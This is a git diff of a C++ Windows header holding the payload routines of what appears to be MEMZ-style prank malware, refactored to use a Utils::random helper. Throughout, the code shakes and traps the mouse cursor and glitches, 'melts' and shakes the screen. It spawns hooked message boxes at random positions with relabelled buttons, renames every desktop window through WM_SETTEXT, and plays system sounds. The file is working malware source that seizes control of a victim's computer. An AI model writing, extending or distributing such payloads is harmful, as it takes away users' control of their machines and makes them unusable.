@@ -1,9 +1,17 @@
 #pragma once
+#include "utils.hpp"
+#include <math.h>
+#include <stdlib.h>
+#include <thread>
+#include <time.h>
+#include <windows.h>
 
-#include "main.h"
-#include "msgbox.h"
-#include "utils.h"
-#include "wintitle.h"
+const int MOUSESHAKE = 30;
+
+int w = GetSystemMetrics(SM_CXSCREEN);
+int h = GetSystemMetrics(SM_CYSCREEN);
+
+HDC hdc = GetDC(0);
 
 POINT cursor;
 int ix = GetSystemMetrics(SM_CXICON) / 2;
@@ -12,8 +20,8 @@ int iy = GetSystemMetrics(SM_CYICON) / 2;
 void moveMouse()
 {
     GetCursorPos(&cursor);
-    SetCursorPos(cursor.x + (random() % MOUSESHAKE - MOUSESHAKE / 2),
-        cursor.y + (random() % MOUSESHAKE - MOUSESHAKE / 2));
+    SetCursorPos(cursor.x + (Utils::random() % MOUSESHAKE - MOUSESHAKE / 2),
+        cursor.y + (Utils::random() % MOUSESHAKE - MOUSESHAKE / 2));
 }
 
 void trapMouseForever()
@@ -33,10 +41,10 @@ void drawErrorCursor()
 
 void screenGlitch()
 {
-    int x1 = random() % (w - 1000);
-    int y1 = random() % (h - 1000);
-    int x2 = random() % (w - 1000);
-    int y2 = random() % (h - 1000);
+    int x1 = Utils::random(w - 1000);
+    int y1 = Utils::random(h - 1000);
+    int x2 = Utils::random(w - 1000);
+    int y2 = Utils::random(h - 1000);
     BitBlt(hdc, x1, y1, w, h, hdc, x2, y2, SRCERASE);
 }
 
@@ -56,15 +64,39 @@ void screenTunnel()
 
 void drawText(const char* text)
 {
-    int x1 = random() % w;
-    int y1 = random() % h;
+    int x1 = Utils::random(w);
+    int y1 = Utils::random(h);
     RECT rect = { x1, y1, x1, y1 };
     DrawTextA(hdc, text, -1, &rect, DT_NOCLIP);
 }
 
+LONG_PTR CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam)
+{
+    CWPRETSTRUCT* msg = (CWPRETSTRUCT*)lParam;
+
+    if (msg->message == WM_INITDIALOG) {
+        int X = Utils::random(GetSystemMetrics(SM_CXSCREEN));
+        int Y = Utils::random(GetSystemMetrics(SM_CYSCREEN));
+        SetWindowPos(msg->hwnd, 0, X, Y, 0, 0, SWP_NOZORDER | SWP_NOSIZE | SWP_SHOWWINDOW);
+        for (int i = 1; i <= 11; i++)
+            SetWindowTextA(GetDlgItem(msg->hwnd, i), "Omegalul");
+    }
+
+    return CallNextHookEx(0, nCode, wParam, lParam);
+}
+
 void spawnMsgBox()
 {
-    CreateThread(NULL, 4096, &ripMessageThread, NULL, NULL, NULL);
+    auto thr = [](void* param) WINAPI -> DWORD {
+        HHOOK hook = SetWindowsHookExA(WH_CALLWNDPROCRET, msgBoxHook, 0, GetCurrentThreadId());
+        DWORD msg = Utils::random(7) + (Utils::random(5) << 4);
+        MessageBoxA(NULL, "text", "caption", msg);
+        Sleep(1000);
+        UnhookWindowsHookEx(hook);
+        return 0;
+    };
+    int thread_param = 42;
+    CreateThread(nullptr, 0, thr, &thread_param, 0, nullptr);
 }
 
 void payloadEarthquake()
@@ -76,8 +108,8 @@ void payloadEarthquake()
     SelectObject(hdc2, screenshot);
 
     BitBlt(hdc2, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
-    BitBlt(hdc, 0, 0, w, h, hdc2, (random() % power) - (power / 2),
-        (random() % power) - (power / 2), SRCCOPY);
+    BitBlt(hdc, 0, 0, w, h, hdc2, (Utils::random(power)) - (power / 2),
+        (Utils::random(power)) - (power / 2), SRCCOPY);
     Sleep(50);
     BitBlt(hdc, 0, 0, w, h, hdc2, 0, 0, SRCCOPY);
 
@@ -92,7 +124,7 @@ void melt()
     SelectObject(hdc2, screenshot);
 
     for (int i = 0; i < 20; i++) {
-        int x = random() % w - 20 / 2;
+        int x = Utils::random(w - 20 / 2);
         for (; x % 20 != 0; x++) {
         }
 
@@ -119,12 +151,16 @@ const unsigned long sounds[] = {
 
 void payloadSound()
 {
-    PlaySoundA((LPCSTR)sounds[random() % 6], GetModuleHandle(NULL),
+    PlaySoundA((LPCSTR)sounds[Utils::random(6)], GetModuleHandle(NULL),
         SND_ASYNC | SND_ALIAS_ID);
 }
 
 void setWinTitle(LPCWSTR t)
 {
-    wintitle = t;
-    EnumChildWindows(GetDesktopWindow(), &EnumChildProc, 0);
+    EnumChildWindows(GetDesktopWindow(),
+        [](HWND hWnd, LPARAM lParam) CALLBACK -> BOOL {
+            SendMessageTimeoutW(hWnd, WM_SETTEXT, 0, lParam, SMTO_ABORTIFHUNG, 100, 0);
+            return 1;
+        },
+        (long)t);
 }
